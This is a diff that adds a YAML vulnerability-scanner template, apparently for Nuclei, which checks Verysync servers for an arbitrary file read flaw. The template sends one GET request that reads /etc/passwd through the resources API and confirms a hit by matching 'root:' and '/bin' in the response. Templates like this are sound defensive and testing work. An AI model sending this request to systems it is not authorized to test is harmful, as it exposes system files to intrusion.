@@ -1,0 +1,36 @@
+id: poc-yaml-verysync-resources-anyfile-read
+info:
+  name: Verisync Resources Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"path\":"
+          - "root:"
+          - "/bin"
+          - "Verysync"
+        negative: false
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "Verysync"
+      - type: word
+        part: header
+        words:
+          - "application/json"
